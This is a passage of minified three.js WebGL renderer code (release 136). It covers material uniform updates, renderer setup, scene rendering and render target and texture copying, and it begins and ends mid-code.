rmalMap.value=F.normalMap,I.normalScale.value.copy(F.normalScale),1===F.side&&I.normalScale.value.negate()),F.displacementMap&&(I.displacementMap.value=F.displacementMap,I.displacementScale.value=F.displacementScale,I.displacementBias.value=F.displacementBias)):r.isMeshStandardMaterial?(t(e,r),r.isMeshPhysicalMaterial?(P=o,n(E=e,T=r),E.ior.value=T.ior,0<T.sheen&&(E.sheenColor.value.copy(T.sheenColor).multiplyScalar(T.sheen),E.sheenRoughness.value=T.sheenRoughness,T.sheenColorMap&&(E.sheenColorMap.value=T.sheenColorMap),T.sheenRoughnessMap&&(E.sheenRoughnessMap.value=T.sheenRoughnessMap)),0<T.clearcoat&&(E.clearcoat.value=T.clearcoat,E.clearcoatRoughness.value=T.clearcoatRoughness,T.clearcoatMap&&(E.clearcoatMap.value=T.clearcoatMap),T.clearcoatRoughnessMap&&(E.clearcoatRoughnessMap.value=T.clearcoatRoughnessMap),T.clearcoatNormalMap&&(E.clearcoatNormalScale.value.copy(T.clearcoatNormalScale),E.clearcoatNormalMap.value=T.clearcoatNormalMap,1===T.side&&E.clearcoatNormalScale.value.negate())),0<T.transmission&&(E.transmission.value=T.transmission,E.transmissionSamplerMap.value=P.texture,E.transmissionSamplerSize.value.set(P.width,P.height),T.transmissionMap&&(E.transmissionMap.value=T.transmissionMap),E.thickness.value=T.thickness,T.thicknessMap&&(E.thicknessMap.value=T.thicknessMap),E.attenuationDistance.value=T.attenuationDistance,E.attenuationColor.value.copy(T.attenuationColor)),E.specularIntensity.value=T.specularIntensity,E.specularColor.value.copy(T.specularColor),T.specularIntensityMap&&(E.specularIntensityMap.value=T.specularIntensityMap),T.specularColorMap&&(E.specularColorMap.value=T.specularColorMap)):n(e,r)):r.isMeshMatcapMaterial?(t(e,r),M=e,(B=r).matcap&&(M.matcap.value=B.matcap),B.bumpMap&&(M.bumpMap.value=B.bumpMap,M.bumpScale.value=B.bumpScale,1===B.side&&(M.bumpScale.value*=-1)),B.normalMap&&(M.normalMap.value=B.normalMap,M.normalScale.value.copy(B.normalScale),1===B.side&&M.normalScale.value.negate()),B.displacementMap&&(M.displacementMap.value=B.displacementMap,M.displacementScale.value=B.displacementScale,M.displacementBias.value=B.displacementBias)):r.isMeshDepthMaterial?(t(e,r),d=e,(p=r).displacementMap&&(d.displacementMap.value=p.displacementMap,d.displacementScale.value=p.displacementScale,d.displacementBias.value=p.displacementBias)):r.isMeshDistanceMaterial?(t(e,r),S=e,(k=r).displacementMap&&(S.displacementMap.value=k.displacementMap,S.displacementScale.value=k.displacementScale,S.displacementBias.value=k.displacementBias),S.referencePosition.value.copy(k.referencePosition),S.nearDistance.value=k.nearDistance,S.farDistance.value=k.farDistance):r.isMeshNormalMaterial?(t(e,r),C=e,(x=r).bumpMap&&(C.bumpMap.value=x.bumpMap,C.bumpScale.value=x.bumpScale,1===x.side&&(C.bumpScale.value*=-1)),x.normalMap&&(C.normalMap.value=x.normalMap,C.normalScale.value.copy(x.normalScale),1===x.side&&C.normalScale.value.negate()),x.displacementMap&&(C.displacementMap.value=x.displacementMap,C.displacementScale.value=x.displacementScale,C.displacementBias.value=x.displacementBias)):r.isLineBasicMaterial?(u=r,(c=e).diffuse.value.copy(u.color),c.opacity.value=u.opacity,r.isLineDashedMaterial&&(l=r,(s=e).dashSize.value=l.dashSize,s.totalSize.value=l.dashSize+l.gapSize,s.scale.value=l.scale)):r.isPointsMaterial?(y=r,b=i,_=a,(g=e).diffuse.value.copy(y.color),g.opacity.value=y.opacity,g.size.value=y.size*b,g.scale.value=.5*_,y.map&&(g.map.value=y.map),y.alphaMap&&(g.alphaMap.value=y.alphaMap),0<y.alphaTest&&(g.alphaTest.value=y.alphaTest),y.map?w=y.map:y.alphaMap&&(w=y.alphaMap),void 0!==w&&(!0===w.matrixAutoUpdate&&w.updateMatrix(),g.uvTransform.value.copy(w.matrix))):r.isSpriteMaterial?(m=r,(A=e).diffuse.value.copy(m.color),A.opacity.value=m.opacity,A.rotation.value=m.rotation,m.map&&(A.map.value=m.map),m.alphaMap&&(A.alphaMap.value=m.alphaMap),0<m.alphaTest&&(A.alphaTest.value=m.alphaTest),m.map?v=m.map:m.alphaMap&&(v=m.alphaMap),void 0!==v&&(!0===v.matrixAutoUpdate&&v.updateMatrix(),A.uvTransform.value.copy(v.matrix))):r.isShadowMaterial?(e.color.value.copy(r.color),e.opacity.value=r.opacity):r.isShaderMaterial&&(r.uniformsNeedUpdate=!1)}}}function La(){var e,t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:{},n=void 0!==t.canvas?t.canvas:((e=ce("canvas")).style.display="block",e),r=void 0!==t.context?t.context:null,i=void 0!==t.alpha&&t.alpha,a=void 0===t.depth||t.depth,o=void 0===t.stencil||t.stencil,s=void 0!==t.antialias&&t.antialias,l=void 0===t.premultipliedAlpha||t.premultipliedAlpha,c=void 0!==t.preserveDrawingBuffer&&t.preserveDrawingBuffer,d=void 0!==t.powerPreference?t.powerPreference:"default",h=void 0!==t.failIfMajorPerformanceCaveat&&t.failIfMajorPerformanceCaveat,f=null,A=null,m=[],y=[];this.domElement=n,this.debug={checkShaderErrors:!0},this.autoClear=!0,this.autoClearColor=!0,this.autoClearDepth=!0,this.autoClearStencil=!0,this.sortObjects=!0,this.clippingPlanes=[],this.localClippingEnabled=!1,this.outputEncoding=R,this.physicallyCorrectLights=!1,this.toneMapping=0,this.toneMappingExposure=1;var b=this,C=!1,x=0,k=0,M=null,B=-1,E=null,T=new fe,P=new fe,I=null,F=n.width,L=n.height,O=1,N=null,D=null,j=new fe(0,0,F,L),U=new fe(0,0,F,L),$=!1,z=[],H=new Gn,V=!1,Q=!1,G=null,W=new Xe,K=new ye,q={background:null,fog:null,environment:null,overrideMaterial:null,isScene:!0};function X(){return null===M?O:1}var Y,J,Z,ee,te,ne,re,ie,ae,oe,se,le,ue,de,pe,he,me,ge,be,_e,we,Ce,xe,Se=r;function ke(e,t){for(var r=0;r<e.length;r++){var i=e[r],a=n.getContext(i,t);if(null!==a)return a}return null}try{var Me={alpha:i,depth:a,stencil:o,antialias:s,premultipliedAlpha:l,preserveDrawingBuffer:c,powerPreference:d,failIfMajorPerformanceCaveat:h};if("setAttribute"in n&&n.setAttribute("data-engine","three.js r".concat("136")),n.addEventListener("webglcontextlost",Pe,!1),n.addEventListener("webglcontextrestored",Ie,!1),null===Se){var Be=["webgl2","webgl","experimental-webgl"];if(!0===b.isWebGL1Renderer&&Be.shift(),null===(Se=ke(Be,Me)))throw ke(Be)?new Error("Error creating WebGL context with your selected attributes."):new Error("Error creating WebGL context.")}void 0===Se.getShaderPrecisionFormat&&(Se.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}})}catch(e){throw e}function Ee(){Y=new Mr(Se),J=new nr(Se,Y,t),Y.init(J),Ce=new ka(Se,Y,J),Z=new xa(Se,Y,J),z[0]=Se.BACK,ee=new Tr(Se),te=new ua,ne=new Sa(Se,Y,Z,te,J,Ce,ee),re=new ir(b),ie=new kr(b),ae=new Kn(Se,J),xe=new er(Se,Y,ae,J),oe=new Br(Se,ae,ee,xe),se=new Nr(Se,oe,ae,ee),be=new Or(Se,J,ne),he=new rr(te),le=new ca(b,re,ie,Y,J,xe,he),ue=new Fa(te),de=new fa,pe=new ba(Y,J),ge=new Zn(b,re,Z,se,l),me=new Ca(b,se,J),_e=new tr(Se,Y,ee,J),we=new Er(Se,Y,ee,J),ee.programs=le.programs,b.capabilities=J,b.extensions=Y,b.properties=te,b.renderLists=de,b.shadowMap=me,b.state=Z,b.info=ee}Ee();var Te=new Ia(b,Se);function Pe(e){e.preventDefault(),C=!0}function Ie(){C=!1;var e=ee.autoReset,t=me.enabled,n=me.autoUpdate,r=me.needsUpdate,i=me.type;Ee(),ee.autoReset=e,me.enabled=t,me.autoUpdate=n,me.needsUpdate=r,me.type=i}function Fe(e){var t,n,r,i=e.target;i.removeEventListener("dispose",Fe),n=t=i,void 0!==(r=te.get(n).programs)&&(r.forEach((function(e){le.releaseProgram(e)})),n.isShaderMaterial&&le.releaseShaderCache(n)),te.remove(t)}this.xr=Te,this.getContext=function(){return Se},this.getContextAttributes=function(){return Se.getContextAttributes()},this.forceContextLoss=function(){var e=Y.get("WEBGL_lose_context");e&&e.loseContext()},this.forceContextRestore=function(){var e=Y.get("WEBGL_lose_context");e&&e.restoreContext()},this.getPixelRatio=function(){return O},this.setPixelRatio=function(e){void 0!==e&&(O=e,this.setSize(F,L,!1))},this.getSize=function(e){return e.set(F,L)},this.setSize=function(e,t,r){Te.isPresenting||(F=e,L=t,n.width=Math.floor(e*O),n.height=Math.floor(t*O),!1!==r&&(n.style.width=e+"px",n.style.height=t+"px"),this.setViewport(0,0,e,t))},this.getDrawingBufferSize=function(e){return e.set(F*O,L*O).floor()},this.setDrawingBufferSize=function(e,t,r){F=e,L=t,O=r,n.width=Math.floor(e*r),n.height=Math.floor(t*r),this.setViewport(0,0,e,t)},this.getCurrentViewport=function(e){return e.copy(T)},this.getViewport=function(e){return e.copy(j)},this.setViewport=function(e,t,n,r){e.isVector4?j.set(e.x,e.y,e.z,e.w):j.set(e,t,n,r),Z.viewport(T.copy(j).multiplyScalar(O).floor())},this.getScissor=function(e){return e.copy(U)},this.setScissor=function(e,t,n,r){e.isVector4?U.set(e.x,e.y,e.z,e.w):U.set(e,t,n,r),Z.scissor(P.copy(U).multiplyScalar(O).floor())},this.getScissorTest=function(){return $},this.setScissorTest=function(e){Z.setScissorTest($=e)},this.setOpaqueSort=function(e){N=e},this.setTransparentSort=function(e){D=e},this.getClearColor=function(e){return e.copy(ge.getClearColor())},this.setClearColor=function(){ge.setClearColor.apply(ge,arguments)},this.getClearAlpha=function(){return ge.getClearAlpha()},this.setClearAlpha=function(){ge.setClearAlpha.apply(ge,arguments)},this.clear=function(e,t,n){var r=0;(void 0===e||e)&&(r|=Se.COLOR_BUFFER_BIT),(void 0===t||t)&&(r|=Se.DEPTH_BUFFER_BIT),(void 0===n||n)&&(r|=Se.STENCIL_BUFFER_BIT),Se.clear(r)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){n.removeEventListener("webglcontextlost",Pe,!1),n.removeEventListener("webglcontextrestored",Ie,!1),de.dispose(),pe.dispose(),te.dispose(),re.dispose(),ie.dispose(),se.dispose(),xe.dispose(),le.dispose(),Te.dispose(),Te.removeEventListener("sessionstart",Oe),Te.removeEventListener("sessionend",Ne),G&&(G.dispose(),G=null),De.stop()},this.renderBufferDirect=function(e,t,n,r,i,a){null===t&&(t=q);var o=i.isMesh&&i.matrixWorld.determinant()<0,s=function(e,t,n,r,i){!0!==t.isScene&&(t=q),ne.resetTextureUnits();var a=t.fog,o=r.isMeshStandardMaterial?t.environment:null,s=null===M?b.outputEncoding:M.texture.encoding,l=(r.isMeshStandardMaterial?ie:re).get(r.envMap||o),c=!0===r.vertexColors&&!!n.attributes.color&&4===n.attributes.color.itemSize,u=!!r.normalMap&&!!n.attributes.tangent,d=!!n.morphAttributes.position,p=!!n.morphAttributes.normal,h=n.morphAttributes.position?n.morphAttributes.position.length:0,f=r.toneMapped?b.toneMapping:0,m=te.get(r),v=A.state.lights;if(!0===V&&(!0===Q||e!==E)){var g=e===E&&r.id===B;he.setState(r,e,g)}var y=!1;r.version===m.__version?m.needsLights&&m.lightsStateVersion!==v.state.version||m.outputEncoding!==s||i.isInstancedMesh&&!1===m.instancing?y=!0:i.isInstancedMesh||!0!==m.instancing?i.isSkinnedMesh&&!1===m.skinning?y=!0:i.isSkinnedMesh||!0!==m.skinning?m.envMap!==l||r.fog&&m.fog!==a?y=!0:void 0===m.numClippingPlanes||m.numClippingPlanes===he.numPlanes&&m.numIntersection===he.numIntersection?(m.vertexAlphas!==c||m.vertexTangents!==u||m.morphTargets!==d||m.morphNormals!==p||m.toneMapping!==f||!0===J.isWebGL2&&m.morphTargetsCount!==h)&&(y=!0):y=!0:y=!0:y=!0:(y=!0,m.__version=r.version);var _=m.currentProgram;!0===y&&(_=$e(r,t,i));var w,C,x=!1,S=!1,k=!1,T=_.getUniforms(),P=m.uniforms;if(Z.useProgram(_.program)&&(k=S=x=!0),r.id!==B&&(B=r.id,S=!0),x||E!==e){if(T.setValue(Se,"projectionMatrix",e.projectionMatrix),J.logarithmicDepthBuffer&&T.setValue(Se,"logDepthBufFC",2/(Math.log(e.far+1)/Math.LN2)),E!==e&&(E=e,k=S=!0),r.isShaderMaterial||r.isMeshPhongMaterial||r.isMeshToonMaterial||r.isMeshStandardMaterial||r.envMap){var I=T.map.cameraPosition;void 0!==I&&I.setValue(Se,K.setFromMatrixPosition(e.matrixWorld))}(r.isMeshPhongMaterial||r.isMeshToonMaterial||r.isMeshLambertMaterial||r.isMeshBasicMaterial||r.isMeshStandardMaterial||r.isShaderMaterial)&&T.setValue(Se,"isOrthographic",!0===e.isOrthographicCamera),(r.isMeshPhongMaterial||r.isMeshToonMaterial||r.isMeshLambertMaterial||r.isMeshBasicMaterial||r.isMeshStandardMaterial||r.isShaderMaterial||r.isShadowMaterial||i.isSkinnedMesh)&&T.setValue(Se,"viewMatrix",e.matrixWorldInverse)}if(i.isSkinnedMesh){T.setOptional(Se,i,"bindMatrix"),T.setOptional(Se,i,"bindMatrixInverse");var F=i.skeleton;F&&(J.floatVertexTextures?(null===F.boneTexture&&F.computeBoneTexture(),T.setValue(Se,"boneTexture",F.boneTexture,ne),T.setValue(Se,"boneTextureSize",F.boneTextureSize)):T.setOptional(Se,F,"boneMatrices"))}return!n||void 0===n.morphAttributes.position&&void 0===n.morphAttributes.normal||be.update(i,n,r,_),(S||m.receiveShadow!==i.receiveShadow)&&(m.receiveShadow=i.receiveShadow,T.setValue(Se,"receiveShadow",i.receiveShadow)),S&&(T.setValue(Se,"toneMappingExposure",b.toneMappingExposure),m.needsLights&&(C=k,(w=P).ambientLightColor.needsUpdate=C,w.lightProbe.needsUpdate=C,w.directionalLights.needsUpdate=C,w.directionalLightShadows.needsUpdate=C,w.pointLights.needsUpdate=C,w.pointLightShadows.needsUpdate=C,w.spotLights.needsUpdate=C,w.spotLightShadows.needsUpdate=C,w.rectAreaLights.needsUpdate=C,w.hemisphereLights.needsUpdate=C),a&&r.fog&&ue.refreshFogUniforms(P,a),ue.refreshMaterialUniforms(P,r,O,L,G),$i.upload(Se,m.uniformsList,P,ne)),r.isShaderMaterial&&!0===r.uniformsNeedUpdate&&($i.upload(Se,m.uniformsList,P,ne),r.uniformsNeedUpdate=!1),r.isSpriteMaterial&&T.setValue(Se,"center",i.center),T.setValue(Se,"modelViewMatrix",i.modelViewMatrix),T.setValue(Se,"normalMatrix",i.normalMatrix),T.setValue(Se,"modelMatrix",i.matrixWorld),_}(e,t,n,r,i);Z.setMaterial(r,o);var l=n.index,c=n.attributes.position;if(null===l){if(void 0===c||0===c.count)return}else if(0===l.count)return;var u,d=1;!0===r.wireframe&&(l=oe.getWireframeAttribute(n),d=2),xe.setup(i,r,s,n,l);var p=_e;null!==l&&(u=ae.get(l),(p=we).setIndex(u));var h=null!==l?l.count:c.count,f=n.drawRange.start*d,m=n.drawRange.count*d,v=null!==a?a.start*d:0,g=null!==a?a.count*d:1/0,y=Math.max(f,v),_=Math.min(h,f+m,v+g)-1,w=Math.max(0,_-y+1);if(0!==w){if(i.isMesh)!0===r.wireframe?(Z.setLineWidth(r.wireframeLinewidth*X()),p.setMode(Se.LINES)):p.setMode(Se.TRIANGLES);else if(i.isLine){var C=r.linewidth;void 0===C&&(C=1),Z.setLineWidth(C*X()),i.isLineSegments?p.setMode(Se.LINES):i.isLineLoop?p.setMode(Se.LINE_LOOP):p.setMode(Se.LINE_STRIP)}else i.isPoints?p.setMode(Se.POINTS):i.isSprite&&p.setMode(Se.TRIANGLES);if(i.isInstancedMesh)p.renderInstances(y,w,i.count);else if(n.isInstancedBufferGeometry){var x=Math.min(n.instanceCount,n._maxInstanceCount);p.renderInstances(y,w,x)}else p.render(y,w)}},this.compile=function(e,t){(A=pe.get(e)).init(),y.push(A),e.traverseVisible((function(e){e.isLight&&e.layers.test(t.layers)&&(A.pushLight(e),e.castShadow&&A.pushShadow(e))})),A.setupLights(b.physicallyCorrectLights),e.traverse((function(t){var n=t.material;if(n)if(Array.isArray(n))for(var r=0;r<n.length;r++)$e(n[r],e,t);else $e(n,e,t)})),y.pop(),A=null};var Le=null;function Oe(){De.stop()}function Ne(){De.start()}var De=new Wn;function Re(e,t,n,r){var i=e.opaque,a=e.transmissive,o=e.transparent;A.setupLightsView(n),0<a.length&&function(e,t,n){if(null===G){var r=!0===s&&!0===J.isWebGL2;G=new(r?ve:Ae)(1024,1024,{generateMipmaps:!0,type:null!==Ce.convert(w)?w:g,minFilter:v,magFilter:p,wrapS:u,wrapT:u,useRenderToTexture:Y.has("WEBGL_multisampled_render_to_texture")})}var i=b.getRenderTarget();b.setRenderTarget(G),b.clear();var a=b.toneMapping;b.toneMapping=0,je(e,t,n),b.toneMapping=a,ne.updateMultisampleRenderTarget(G),ne.updateRenderTargetMipmap(G),b.setRenderTarget(i)}(i,t,n),r&&Z.viewport(T.copy(r)),0<i.length&&je(i,t,n),0<a.length&&je(a,t,n),0<o.length&&je(o,t,n)}function je(e,t,n){for(var r=!0===t.isScene?t.overrideMaterial:null,i=0,a=e.length;i<a;i++){var o=e[i],s=o.object,l=o.geometry,c=null===r?o.material:r,u=o.group;s.layers.test(n.layers)&&Ue(s,t,n,l,c,u)}}function Ue(e,t,n,r,i,a){e.onBeforeRender(b,t,n,r,i,a),e.modelViewMatrix.multiplyMatrices(n.matrixWorldInverse,e.matrixWorld),e.normalMatrix.getNormalMatrix(e.modelViewMatrix),i.onBeforeRender(b,t,n,r,e,a),!0===i.transparent&&2===i.side?(i.side=1,i.needsUpdate=!0,b.renderBufferDirect(n,t,r,i,e,a),i.side=0,i.needsUpdate=!0,b.renderBufferDirect(n,t,r,i,e,a),i.side=2):b.renderBufferDirect(n,t,r,i,e,a),e.onAfterRender(b,t,n,r,i,a)}function $e(e,t,n){!0!==t.isScene&&(t=q);var r=te.get(e),i=A.state.lights,a=A.state.shadowsArray,o=i.state.version,s=le.getParameters(e,i.state,a,t,n),l=le.getProgramCacheKey(s),c=r.programs;r.environment=e.isMeshStandardMaterial?t.environment:null,r.fog=t.fog,r.envMap=(e.isMeshStandardMaterial?ie:re).get(e.envMap||r.environment),void 0===c&&(e.addEventListener("dispose",Fe),c=new Map,r.programs=c);var u=c.get(l);if(void 0!==u){if(r.currentProgram===u&&r.lightsStateVersion===o)return ze(e,s),u}else s.uniforms=le.getUniforms(e),e.onBuild(n,s,b),e.onBeforeCompile(s,b),u=le.acquireProgram(s,l),c.set(l,u),r.uniforms=s.uniforms;var d,p=r.uniforms;(e.isShaderMaterial||e.isRawShaderMaterial)&&!0!==e.clipping||(p.clippingPlanes=he.uniform),ze(e,s),r.needsLights=(d=e).isMeshLambertMaterial||d.isMeshToonMaterial||d.isMeshPhongMaterial||d.isMeshStandardMaterial||d.isShadowMaterial||d.isShaderMaterial&&!0===d.lights,r.lightsStateVersion=o,r.needsLights&&(p.ambientLightColor.value=i.state.ambient,p.lightProbe.value=i.state.probe,p.directionalLights.value=i.state.directional,p.directionalLightShadows.value=i.state.directionalShadow,p.spotLights.value=i.state.spot,p.spotLightShadows.value=i.state.spotShadow,p.rectAreaLights.value=i.state.rectArea,p.ltc_1.value=i.state.rectAreaLTC1,p.ltc_2.value=i.state.rectAreaLTC2,p.pointLights.value=i.state.point,p.pointLightShadows.value=i.state.pointShadow,p.hemisphereLights.value=i.state.hemi,p.directionalShadowMap.value=i.state.directionalShadowMap,p.directionalShadowMatrix.value=i.state.directionalShadowMatrix,p.spotShadowMap.value=i.state.spotShadowMap,p.spotShadowMatrix.value=i.state.spotShadowMatrix,p.pointShadowMap.value=i.state.pointShadowMap,p.pointShadowMatrix.value=i.state.pointShadowMatrix);var h=u.getUniforms(),f=$i.seqWithValue(h.seq,p);return r.currentProgram=u,r.uniformsList=f,u}function ze(e,t){var n=te.get(e);n.outputEncoding=t.outputEncoding,n.instancing=t.instancing,n.skinning=t.skinning,n.morphTargets=t.morphTargets,n.morphNormals=t.morphNormals,n.morphTargetsCount=t.morphTargetsCount,n.numClippingPlanes=t.numClippingPlanes,n.numIntersection=t.numClipIntersection,n.vertexAlphas=t.vertexAlphas,n.vertexTangents=t.vertexTangents,n.toneMapping=t.toneMapping}De.setAnimationLoop((function(e){Le&&Le(e)})),"undefined"!=typeof window&&De.setContext(window),this.setAnimationLoop=function(e){Le=e,Te.setAnimationLoop(e),null===e?De.stop():De.start()},Te.addEventListener("sessionstart",Oe),Te.addEventListener("sessionend",Ne),this.render=function(e,t){if((void 0===t||!0===t.isCamera)&&!0!==C){!0===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),!0===Te.enabled&&!0===Te.isPresenting&&(!0===Te.cameraAutoUpdate&&Te.updateCamera(t),t=Te.getCamera()),!0===e.isScene&&e.onBeforeRender(b,e,t,M),(A=pe.get(e,y.length)).init(),y.push(A),W.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),H.setFromProjectionMatrix(W),Q=this.localClippingEnabled,V=he.init(this.clippingPlanes,Q,t),(f=de.get(e,m.length)).init(),m.push(f),function e(t,n,r,i){if(!1!==t.visible){if(t.layers.test(n.layers))if(t.isGroup)r=t.renderOrder;else if(t.isLOD)!0===t.autoUpdate&&t.update(n);else if(t.isLight)A.pushLight(t),t.castShadow&&A.pushShadow(t);else if(t.isSprite){if(!t.frustumCulled||H.intersectsSprite(t)){i&&K.setFromMatrixPosition(t.matrixWorld).applyMatrix4(W);var a=se.update(t),o=t.material;o.visible&&f.push(t,a,o,r,K.z,null)}}else if((t.isMesh||t.isLine||t.isPoints)&&(t.isSkinnedMesh&&t.skeleton.frame!==ee.render.frame&&(t.skeleton.update(),t.skeleton.frame=ee.render.frame),!t.frustumCulled||H.intersectsObject(t))){i&&K.setFromMatrixPosition(t.matrixWorld).applyMatrix4(W);var s=se.update(t),l=t.material;if(Array.isArray(l))for(var c=s.groups,u=0,d=c.length;u<d;u++){var p=c[u],h=l[p.materialIndex];h&&h.visible&&f.push(t,s,h,r,K.z,p)}else l.visible&&f.push(t,s,l,r,K.z,null)}for(var m=t.children,v=0,g=m.length;v<g;v++)e(m[v],n,r,i)}}(e,t,0,b.sortObjects),f.finish(),!0===b.sortObjects&&f.sort(N,D),!0===V&&he.beginShadows();var n=A.state.shadowsArray;if(me.render(n,e,t),!0===V&&he.endShadows(),!0===this.info.autoReset&&this.info.reset(),ge.render(f,e),A.setupLights(b.physicallyCorrectLights),t.isArrayCamera)for(var r=t.cameras,i=0,a=r.length;i<a;i++){var o=r[i];Re(f,e,o,o.viewport)}else Re(f,e,t);null!==M&&(ne.updateMultisampleRenderTarget(M),ne.updateRenderTargetMipmap(M)),!0===e.isScene&&e.onAfterRender(b,e,t),Z.buffers.depth.setTest(!0),Z.buffers.depth.setMask(!0),Z.buffers.color.setMask(!0),Z.setPolygonOffset(!1),xe.resetDefaultState(),B=-1,E=null,y.pop(),A=0<y.length?y[y.length-1]:null,m.pop(),f=0<m.length?m[m.length-1]:null}},this.getActiveCubeFace=function(){return x},this.getActiveMipmapLevel=function(){return k},this.getRenderTarget=function(){return M},this.setRenderTargetTextures=function(e,t,n){te.get(e.texture).__webglTexture=t,te.get(e.depthTexture).__webglTexture=n;var r=te.get(e);r.__hasExternalTextures=!0,r.__hasExternalTextures&&(r.__autoAllocateDepthBuffer=void 0===n,r.__autoAllocateDepthBuffer||e.useRenderToTexture&&(e.useRenderToTexture=!1,e.useRenderbuffer=!0))},this.setRenderTargetFramebuffer=function(e,t){var n=te.get(e);n.__webglFramebuffer=t,n.__useDefaultFramebuffer=void 0===t},this.setRenderTarget=function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0;x=t,k=n;var r=!0;if(M=e){var i=te.get(e);void 0!==i.__useDefaultFramebuffer?(Z.bindFramebuffer(Se.FRAMEBUFFER,null),r=!1):void 0===i.__webglFramebuffer?ne.setupRenderTarget(e):i.__hasExternalTextures&&ne.rebindTextures(e,te.get(e.texture).__webglTexture,te.get(e.depthTexture).__webglTexture)}var a=null,o=!1,s=!1;if(e){var l=e.texture;(l.isDataTexture3D||l.isDataTexture2DArray)&&(s=!0);var c=te.get(e).__webglFramebuffer;e.isWebGLCubeRenderTarget?(a=c[t],o=!0):a=e.useRenderbuffer?te.get(e).__webglMultisampledFramebuffer:c,T.copy(e.viewport),P.copy(e.scissor),I=e.scissorTest}else T.copy(j).multiplyScalar(O).floor(),P.copy(U).multiplyScalar(O).floor(),I=$;if(Z.bindFramebuffer(Se.FRAMEBUFFER,a)&&J.drawBuffers&&r){var u=!1;if(e)if(e.isWebGLMultipleRenderTargets){var d=e.texture;if(z.length!==d.length||z[0]!==Se.COLOR_ATTACHMENT0){for(var p=0,h=d.length;p<h;p++)z[p]=Se.COLOR_ATTACHMENT0+p;z.length=d.length,u=!0}}else 1===z.length&&z[0]===Se.COLOR_ATTACHMENT0||(z[0]=Se.COLOR_ATTACHMENT0,z.length=1,u=!0);else 1===z.length&&z[0]===Se.BACK||(z[0]=Se.BACK,z.length=1,u=!0);u&&(J.isWebGL2?Se.drawBuffers(z):Y.get("WEBGL_draw_buffers").drawBuffersWEBGL(z))}if(Z.viewport(T),Z.scissor(P),Z.setScissorTest(I),o){var f=te.get(e.texture);Se.framebufferTexture2D(Se.FRAMEBUFFER,Se.COLOR_ATTACHMENT0,Se.TEXTURE_CUBE_MAP_POSITIVE_X+t,f.__webglTexture,n)}else if(s){var A=te.get(e.texture),m=t||0;Se.framebufferTextureLayer(Se.FRAMEBUFFER,Se.COLOR_ATTACHMENT0,A.__webglTexture,n||0,m)}B=-1},this.readRenderTargetPixels=function(e,t,n,r,i,a,o){if(e&&e.isWebGLRenderTarget){var s=te.get(e).__webglFramebuffer;if(e.isWebGLCubeRenderTarget&&void 0!==o&&(s=s[o]),s){Z.bindFramebuffer(Se.FRAMEBUFFER,s);try{var l=e.texture,c=l.format,u=l.type;if(c!==S&&Ce.convert(c)!==Se.getParameter(Se.IMPLEMENTATION_COLOR_READ_FORMAT))return;var d=u===w&&(Y.has("EXT_color_buffer_half_float")||J.isWebGL2&&Y.has("EXT_color_buffer_float"));if(!(u===g||Ce.convert(u)===Se.getParameter(Se.IMPLEMENTATION_COLOR_READ_TYPE)||u===_&&(J.isWebGL2||Y.has("OES_texture_float")||Y.has("WEBGL_color_buffer_float"))||d))return;Se.checkFramebufferStatus(Se.FRAMEBUFFER)===Se.FRAMEBUFFER_COMPLETE&&0<=t&&t<=e.width-r&&0<=n&&n<=e.height-i&&Se.readPixels(t,n,r,i,Ce.convert(c),Ce.convert(u),a)}finally{var p=null!==M?te.get(M).__webglFramebuffer:null;Z.bindFramebuffer(Se.FRAMEBUFFER,p)}}}},this.copyFramebufferToTexture=function(e,t){var n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0;if(!0===t.isFramebufferTexture){var r=Math.pow(2,-n),i=Math.floor(t.image.width*r),a=Math.floor(t.image.height*r);ne.setTexture2D(t,0),Se.copyTexSubImage2D(Se.TEXTURE_2D,n,0,0,e.x,e.y,i,a),Z.unbindTexture()}},this.copyTextureToTexture=function(e,t,n){var r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:0,i=t.image.width,a=t.image.height,o=Ce.convert(n.format),s=Ce.convert(n.type);ne.setTexture2D(n,0),Se.pixelStorei(Se.UNPACK_FLIP_Y_WEBGL,n.flipY),Se.pixelStorei(Se.UNPACK_PREMULTIPLY_ALPHA_WEBGL,n.premultiplyAlpha),Se.pixelStorei(Se.UNPACK_ALIGNMENT,n.unpackAlignment),t.isDataTexture?Se.texSubImage2D(Se.TEXTURE_2D,r,e.x,e.y,i,a,o,s,t.image.data):t.isCompressedTexture?Se.compressedTexSubImage2D(Se.TEXTURE_2D,r,e.x,e.y,t.mipmaps[0].width,t.mipmaps[0].height,o,t.mipmaps[0].data):Se.texSubImage2D(Se.TEXTURE_2D,r,e.x,e.y,o,s,t.image),0===r&&n.generateMipmaps&&Se.generateMipmap(Se.TEXTURE_2D),Z.unbindTexture()},this.copyTextureToTexture3D=function(e,t,n,r){var i=4<arguments.length&&void 0!==arguments[4]?arguments[4]:0;if(!b.isWebGL1Renderer){var a,o=e.max.x-e.min.x+1,s=e.max.y-e.min.y+1,l=e.max.z-e.min.z+1,c=Ce.convert(r.format),u=Ce.convert(r.type);if(r.isDataTexture3D)ne.setTexture3D(r,0),a=Se.TEXTURE_3D;else{if(!r.isDataTexture2DArray)return;ne.setTexture2DArray(r,0),a=Se.TEXTURE_2D_ARRAY}Se.pixelStorei(Se.UNPACK_FLIP_Y_WEBGL,r.flipY),Se.pixelStorei(Se.UNPACK_PREMULTIPLY_ALPHA_WEBGL,r.premultiplyAlpha),Se.pixelStorei(Se.UNPACK_ALIGNMENT,r.unpackAlignment);var 